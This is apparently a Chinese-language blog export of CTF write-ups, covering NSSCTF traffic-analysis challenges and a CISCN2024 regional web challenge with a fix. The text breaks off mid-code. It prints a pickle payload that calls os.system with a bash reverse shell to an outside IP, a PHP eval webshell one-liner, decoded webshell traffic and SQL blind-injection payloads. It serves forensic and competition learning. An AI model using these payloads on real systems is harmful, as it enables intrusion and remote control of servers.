<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;cat /Th4s_IS_VERY_Import_Fi1e&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>

<h2 id="Task3-1"><a href="#Task3-1" class="headerlink" title="Task3"></a>Task3</h2><p><strong>黑客反弹shell的ip和端口是什么</strong></p>
<p>先url解码然后再base64解码即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;bash -i &gt;&amp; /dev/tcp/192.168.2.197/8888 0&gt;&amp;1&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>



<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><h2 id="Task1-2"><a href="#Task1-2" class="headerlink" title="Task1"></a>Task1</h2><p><strong>黑客登录系统使用的密码是什么</strong></p>
<p>追踪tcp流，在第六个流找到密码<code>Admin123@#</code></p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417174942408.png"></p>
<h2 id="Task2-2"><a href="#Task2-2" class="headerlink" title="Task2"></a>Task2</h2><p><strong>黑客修改了一个日志文件，文件的绝对路径为什么</strong></p>
<p>在第26个流找到引用<code>21_08_07.log</code>日志文件并命令执行，则该文件被植入木马</p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417175333064.png"></p>
<p>文件的绝对路径为<code>/var/www/html/data/Runtime/Logs/Home/21_08_07.log</code></p>
<h2 id="Task3-2"><a href="#Task3-2" class="headerlink" title="Task3"></a>Task3</h2><p><strong>黑客获取webshell之后，权限是是什么</strong></p>
<p>我们利用语法，搜索http请求中包含<code>whoami</code>命令执行的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p>找到24和28流，其中28流的200响应包中找到用户权限为<code>www-data</code></p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417181946403.png"></p>
<h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><p><strong>黑客写入的webshell文件名是什么</strong></p>
<p>在第33个流找到写入木马的命令，文件名为<code>1.php</code></p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240417182628708.png"></p>
<h2 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h2><p><strong>黑客上传的代理工具客户端名字是什么</strong></p>
<p>因为我们知道写马到1.php，我们筛选一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;1.php&quot;</span><br></pre></td></tr></table></figure>

<p>然后一个个看，在第39个流追踪http流，发现代理工具<code>frpc.ini</code></p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240418193436502.png"></p>
<p>我们分析一下是如何回显上述列表的，将发包数据解码并美化一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaa=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">	return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">	$output=ob_get_contents();</span><br><span class="line">	ob_end_clean();</span><br><span class="line">	echo &quot;693&quot;.&quot;d434&quot;;</span><br><span class="line">	echo @asenc($output);</span><br><span class="line">	echo &quot;a3&quot;.&quot;7cb&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">	$D=base64_decode(substr($_POST[&quot;j68071301598f&quot;],2));</span><br><span class="line">	$F=@opendir($D);</span><br><span class="line">	if($F==NULL) &#123;</span><br><span class="line">		echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$M=NULL;</span><br><span class="line">		$L=NULL;</span><br><span class="line">		while($N=@readdir($F)) &#123;</span><br><span class="line">			$P=$D.$N;</span><br><span class="line">			$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));</span><br><span class="line">			@$E=substr(base_convert(@fileperms($P),10,8),-4);</span><br><span class="line">			$R=&quot;	&quot;.$T.&quot;	&quot;.@filesize($P).&quot;	&quot;.$E.&quot;</span><br><span class="line">&quot;;</span><br><span class="line">			if(@is_dir($P))$M.=$N.&quot;/&quot;.$R; else $L.=$N.$R;</span><br><span class="line">		&#125;</span><br><span class="line">		echo $M.$L;</span><br><span class="line">		@closedir($F);</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">	echo &quot;ERROR://&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br><span class="line">&amp;j68071301598f=hML3Zhci93d3cvaHRtbC8=</span><br></pre></td></tr></table></figure>

<p>我们重点看下面函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function asoutput() &#123;</span><br><span class="line">	$output=ob_get_contents();</span><br><span class="line">	ob_end_clean();</span><br><span class="line">	echo &quot;693&quot;.&quot;d434&quot;;</span><br><span class="line">	echo @asenc($output);</span><br><span class="line">	echo &quot;a3&quot;.&quot;7cb&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由回显内容可以知道<code>@asenc($output)</code>就是输出的列表，而<code>$output</code>是调用<code>ob_get_contents()</code>，它用于获取当前输出缓冲区的内容并返回。 然后看向try的过程，发现POST参数从第二位开始截取并解码，结果为<code>/var/www/html</code>，那么应该就是读取该路径下的文件。</p>
<h2 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h2><p><strong>黑客代理工具的回连服务端IP是什么</strong></p>
<p>追踪tcp流，在第38个流找到hex加密数据，解码得到ip为<code>192.168.239.123</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.239.123</span><br><span class="line">server_port = 7778</span><br><span class="line">token=Xa3BJf2l5enmN6Z7A8mv</span><br><span class="line"></span><br><span class="line">[test_sock5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port =8111</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = 0HDFt16cLQJ</span><br><span class="line">plugin_passwd = JTN276Gp</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure>

<h2 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h2><p><strong>黑客的socks5的连接账号、密码是什么</strong></p>
<p>前一题得到账号和密码<code>0HDFt16cLQJ#JTN276Gp</code></p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="Task1-3"><a href="#Task1-3" class="headerlink" title="Task1"></a>Task1</h2><p><strong>黑客在注入过程中采用的注入手法叫什么</strong></p>
<p>查看日志的payload，很明显的布尔盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and if(substr(database(),1,1) = &#x27;.&#x27;,1,(select table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>



<h2 id="Task2-3"><a href="#Task2-3" class="headerlink" title="Task2"></a>Task2</h2><p><strong>黑客在注入过程中，最终获取flag的数据库名、表名和字段名是什么</strong></p>
<p>依次查找即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">table_schema=&#x27;sqli&#x27;</span><br><span class="line">table_name=&#x27;flag&#x27;</span><br><span class="line">column=&#x27;flag&#x27;</span><br></pre></td></tr></table></figure>





<h2 id="Task3-3"><a href="#Task3-3" class="headerlink" title="Task3"></a>Task3</h2><p><strong>黑客最后获取到的flag字符串为什么</strong></p>
<p>把文件内容url解码一下，保存为md文件然后把出现的<code>€</code>去掉，因为UTF-8无法识别</p>
<p>然后GPT写个脚本，输出每次注入同一位置的最后一行的对应字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 读取文件内容</span><br><span class="line">with open(r&#x27;C:\Users\罗思远\Desktop\流量分析\NSSCTF\SQL注入\out.md&#x27;, &#x27;r&#x27;,encoding=&#x27;UTF-8&#x27;) as file:</span><br><span class="line">    file_content = file.readlines()</span><br><span class="line"></span><br><span class="line"># 创建字典存储数字和行索引</span><br><span class="line">index_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"># 遍历每一行</span><br><span class="line">for index, line in enumerate(file_content):</span><br><span class="line">    # 提取数字部分</span><br><span class="line">    num = line.split(&#x27;,&#x27;)[1].strip()</span><br><span class="line"></span><br><span class="line">    # 将数字和行索引存储到字典中</span><br><span class="line">    if num in index_dict:</span><br><span class="line">        index_dict[num].append(index)</span><br><span class="line">    else:</span><br><span class="line">        index_dict[num] = [index]</span><br><span class="line"></span><br><span class="line"># 获取每个数字对应的最后一个行索引</span><br><span class="line">last_indexes = [indexes[-1] for indexes in index_dict.values()]</span><br><span class="line"></span><br><span class="line">results = []</span><br><span class="line">for index in last_indexes:</span><br><span class="line">    line = file_content[index]</span><br><span class="line">    start_quote = line.find(&quot;&#x27;&quot;) + 1</span><br><span class="line">    end_quote = line.find(&quot;&#x27;&quot;, start_quote)</span><br><span class="line">    content = line[start_quote:end_quote]</span><br><span class="line">    results.append(content)</span><br><span class="line"></span><br><span class="line"># 拼接结果</span><br><span class="line">result = &#x27;&#x27;.join(results)</span><br><span class="line"></span><br><span class="line"># 输出结果</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240419131922872.png"></p>
<h1 id="ios"><a href="#ios" class="headerlink" title="ios"></a>ios</h1><p><strong>背景</strong></p>
<blockquote>
<p>一位ios的安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答</p>
</blockquote>
<h2 id="Task1-4"><a href="#Task1-4" class="headerlink" title="Task1"></a>Task1</h2><p><strong>黑客所控制的C&amp;C服务器IP是什么</strong></p>
<p>查看下http流，在第一行也就是第十五个流找到控制ip</p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240420000538452.png"></p>
<h2 id="Task2-4"><a href="#Task2-4" class="headerlink" title="Task2"></a>Task2</h2><p><strong>黑客利用的Github开源项目的名字是什么</strong></p>
<p>直接筛选一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;github&quot;</span><br></pre></td></tr></table></figure>

<p>github后面依次是用户和仓库，所以为<code>Stowaway</code></p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240420000759739.png"></p>
<h2 id="Task3-4"><a href="#Task3-4" class="headerlink" title="Task3"></a>Task3</h2><p><strong>通讯加密密钥的明文是什么</strong></p>
<p>由前面知道开源项目地址，访问一下获得信息<code>-s</code>后的为加密密钥</p>
<p>所以明文为<code>hack4sec</code></p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240420001432616.png"></p>
<h2 id="Task4-1"><a href="#Task4-1" class="headerlink" title="Task4"></a>Task4</h2><p><strong>黑客通过SQL盲注拿到了一个敏感数据，内容是什么</strong></p>
<p>查找http流没有收获，结合题目给了私钥文件keylog.txt，那么有部分流量应该是加密过的</p>
<p><code>编辑 =&gt; 首选项</code>找到Protocols(协议)，点击TLS并导入keylog文件</p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240421170300952.png"></p>
<p>成功得到http2流，然后搜索select</p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240421170625538.png"></p>
<p>再筛选一下目的ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip.dst == 192.168.1.12 &amp;&amp; http2</span><br></pre></td></tr></table></figure>

<p>接着导出文本</p>
<p><img src="/article/%E9%99%87%E5%89%91%E6%9D%AF2021/image-20240421170723870.png"></p>
<p>利用脚本将需要的sql盲注语句url解码并保存为out.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"># 读取文件</span><br><span class="line">file_path = r&quot;C:\Users\罗思远\Desktop\流量分析\NSSCTF\ios\test.txt&quot;  # 替换为你的文件路径</span><br><span class="line"></span><br><span class="line">with open(file_path, &quot;r&quot;, encoding=&#x27;UTF-8&#x27;) as file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line"></span><br><span class="line">target_sentence = &quot;GET /info?l=1&quot;  # 替换为你想要匹配的句子</span><br><span class="line"></span><br><span class="line">matching_parts = []</span><br><span class="line">for line in lines:</span><br><span class="line">    if target_sentence in line:</span><br><span class="line">        start_index = line.find(target_sentence)</span><br><span class="line">        end_index = line.find(&quot;end%29&quot;)</span><br><span class="line">        if end_index != -1:</span><br><span class="line">            part = line[start_index:end_index + len(&quot;end%29&quot;)].strip()</span><br><span class="line">            decoded_part = urllib.parse.unquote(part)</span><br><span class="line">            matching_parts.append(decoded_part)</span><br><span class="line"></span><br><span class="line"># 将匹配的部分保存到文件</span><br><span class="line">output_file = r&quot;C:\Users\罗思远\Desktop\流量分析\NSSCTF\ios\out.txt&quot;  # 输出文件名</span><br><span class="line"></span><br><span class="line">with open(output_file, &quot;w&quot;, encoding=&#x27;UTF-8&#x27;) as file:</span><br><span class="line">    for part in matching_parts:</span><br><span class="line">        file.write(part + &quot;\n&quot;)</span><br></pre></td></tr></table></figure>

<p>然后继续使用脚本读取对应位置的最后一个盲注字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 读取文件内容</span><br><span class="line">with open(r&#x27;C:\Users\罗思远\Desktop\流量分析\NSSCTF\ios\out.txt&#x27;, &#x27;r&#x27;,encoding=&#x27;UTF-8&#x27;) as file:</span><br><span class="line">    file_content = file.readlines()</span><br><span class="line"></span><br><span class="line"># 创建字典存储数字和行索引</span><br><span class="line">index_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"># 遍历每一行</span><br><span class="line">for index, line in enumerate(file_content):</span><br><span class="line">    # 提取数字部分</span><br><span class="line">    num = line.split(&#x27;,&#x27;)[1].strip()</span><br><span class="line"></span><br><span class="line">    # 将数字和行索引存储到字典中</span><br><span class="line">    if num in index_dict:</span><br><span class="line">        index_dict[num].append(index)</span><br><span class="line">    else:</span><br><span class="line">        index_dict[num] = [index]</span><br><span class="line"></span><br><span class="line"># 获取每个数字对应的最后一个行索引</span><br><span class="line">last_indexes = [indexes[-1] for indexes in index_dict.values()]</span><br><span class="line"></span><br><span class="line">results = []</span><br><span class="line">for index in last_indexes:</span><br><span class="line">    line = file_content[index]</span><br><span class="line">    start_quote = line.find(&quot;\&quot;&quot;) + 1</span><br><span class="line">    end_quote = line.find(&quot;\&quot;&quot;, start_quote)</span><br><span class="line">    content = line[start_quote:end_quote]</span><br><span class="line">    results.append(content)</span><br><span class="line"></span><br><span class="line"># 拼接结果</span><br><span class="line">result = &#x27;&#x27;.join(results)</span><br><span class="line"></span><br><span class="line"># 输出结果</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>得到十六进制数据，直接cyberchef解码（因为是盲注，出现ZZZ说明前面已经结束了）</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240421170940191.png" alt="image-20240421170940191"></p>
<h2 id="Task5-1"><a href="#Task5-1" class="headerlink" title="Task5"></a>Task5</h2><p><strong>黑客端口扫描的扫描器的扫描范围是什么</strong></p>
<p><code>分析 =&gt; 专家信息</code>找到<code>TCP: Connection reset (RST)</code>，端口扫描的特征是RST位</p>
<blockquote>
<p>在TCP连接的建立和关闭过程中，数据包中的TCP头部包含了一些标志位，用于指示连接的状态。其中，RST标志位用于重置（Reset）一个TCP连接。</p>
</blockquote>
<p>发现端口号是均匀增长，很明显的特征。端口是 10-499</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240421172832871.png" alt="image-20240421172832871"></p>
<h2 id="Task6-1"><a href="#Task6-1" class="headerlink" title="Task6"></a>Task6</h2><p><strong>被害者手机上被拿走了的私钥文件内容是什么</strong></p>
<p>无答案</p>
<h2 id="Task7-1"><a href="#Task7-1" class="headerlink" title="Task7"></a>Task7</h2><p><strong>黑客访问&#x2F;攻击了内网的几个服务器，IP地址为什么</strong></p>
<p>注：多个IP之间按从小到大排序，使用#来分隔，例如127.0.0.1#192.168.0.1)</p>
<p>我们前面已经导出sql盲注的txt文件，目标ip是<code>192.168.1.12</code>说明在被攻击</p>
<p>其次我们查看log日志文件，发现有对<code>172.28.0.2</code>进行攻击，大概过程为上传木马然后命令执行</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240421173553044.png" alt="image-20240421173553044"></p>
<p>所以被攻击的IP有两个<code>172.28.0.2#192.168.1.12</code></p>
<h2 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h2><p><strong>黑客写入了一个webshell，其密码为什么</strong></p>
<p>注意看上一题是如何命令执行的，由于参数为fxxk所以大概木马语句如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_GET[&#x27;fxxk&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>密码即为fxxk</p>
]]></content>
      <categories>
        <category>流量分析</category>
      </categories>
      <tags>
        <tag>NSSCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2024 华东南赛区</title>
    <url>/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA.html</url>
    <content><![CDATA[<p>记录我福师大热情的篮球场</p>
<span id="more"></span>

<h1 id="CISCN2024-华东南赛区"><a href="#CISCN2024-华东南赛区" class="headerlink" title="CISCN2024 华东南赛区"></a>CISCN2024 华东南赛区</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>倒一身份进入华东南分区赛！！比赛前一天准备蛮多东西，一晚上在本地搭建ai模型，又下载一堆工具，对我来说真的蛮紧张的。不过还好超常发挥，做三道web直直直直直接打到15名。后面fix除了那道原型链污染可惜之外，其他拿源码也修不明白呜呜呜。总的来说除了比赛场地非常热之外，分区赛体验感还不错。</p>
<hr>
<h2 id="submit"><a href="#submit" class="headerlink" title="submit"></a>submit</h2><h3 id="BREAK"><a href="#BREAK" class="headerlink" title="BREAK"></a>BREAK</h3><p>文件上传功能</p>
<p>有对php字符进行检测，<code>&lt;=</code>直接绕过</p>
<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623091443579.png"></p>
<p>访问文件上传路径，得到flag</p>
<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623091428121.png"></p>
<h3 id="FIX"><a href="#FIX" class="headerlink" title="FIX"></a>FIX</h3><p>由于题目要求是png图片，直接加个白名单检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$allowedExtensions = array(&quot;png&quot;);</span><br><span class="line">$extension = pathinfo($_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;], PATHINFO_EXTENSION);</span><br><span class="line">// 检查文件类型是否允许上传</span><br><span class="line">if (!in_array(strtolower($extension), $allowedExtensions)) &#123;</span><br><span class="line">    echo &quot;只允许上传png&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终将upload.php替换就行，不需要重启服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// $path = &quot;./uploads&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">$content = file_get_contents($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">$allow_content_type = array(&quot;image/png&quot;);</span><br><span class="line">$type = $_FILES[&quot;myfile&quot;][&quot;type&quot;];</span><br><span class="line"></span><br><span class="line">//修复部分</span><br><span class="line">$allowedExtensions = array(&quot;png&quot;);</span><br><span class="line">$extension = pathinfo($_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;], PATHINFO_EXTENSION);</span><br><span class="line">// 检查文件类型是否允许上传</span><br><span class="line">if (!in_array(strtolower($extension), $allowedExtensions)) &#123;</span><br><span class="line">    echo &quot;只允许上传png&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">if (!in_array($type, $allow_content_type)) &#123;</span><br><span class="line">    die(&quot;只允许png哦!&lt;br&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/(php|script|xml|user|htaccess)/i&#x27;, $content)) &#123;</span><br><span class="line">    // echo &quot;匹配成功!&quot;;</span><br><span class="line">    die(&#x27;鼠鼠说你的内容不符合哦0-0&#x27;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $file = $path . &#x27;/&#x27; . $_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;];</span><br><span class="line">echo $file;</span><br><span class="line"></span><br><span class="line">if (move_uploaded_file($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;], $file)) &#123;</span><br><span class="line">        file_put_contents($file, $content);</span><br><span class="line">        echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">        echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!----&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="粗心的程序员"><a href="#粗心的程序员" class="headerlink" title="粗心的程序员"></a>粗心的程序员</h2><h3 id="BREAK-1"><a href="#BREAK-1" class="headerlink" title="BREAK"></a>BREAK</h3><p>扫描目录存在<a href="http://www.zip源码泄露/">www.zip源码泄露</a></p>
<p>随便注册一个用户登录，注意到是用户修改名字的功能</p>
<p>我们审一下代码</p>
<p><strong>edit.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;default_info_auto_recovery.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckNewUser</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt;<span class="number">5</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;新用户名长度必须大于等于5或者小于等于10!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$id</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO ACCESS!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newusername</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;newusername&#x27;</span>];</span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">CheckNewUser</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$newusername</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$info</span> != <span class="string">&quot;ok&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$info</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE username = ?&quot;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">1</span>,<span class="variable">$newusername</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"><span class="variable">$cont</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cont</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;该用户已存在!&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE user SET username= ? where id=?&quot;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">1</span>,<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$newusername</span>,ENT_QUOTES));</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">2</span>,<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$id</span>,ENT_QUOTES));</span><br><span class="line"><span class="variable">$status</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$status</span>)&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$newusername</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;修改成功!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;修改失败!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>edit.php主要就是接收POST参数的新用户名，然后对数据库进行操作，最后写入session的username。不过这里有<code>bindValue()</code>和<code>htmlspecialchars()</code>，那么很明显不存在sql注入</p>
<p>我们再看看<strong>home.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;default_info_auto_recovery.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]?:<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\?|php|:/i&quot;</span>,<span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> &amp;&amp; <span class="variable">$id</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello,&quot;</span>.<span class="string">&quot;<span class="subst">$username</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;//登陆时间<span class="subst">$time</span>,<span class="subst">$username</span> <span class="subst">$p</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span 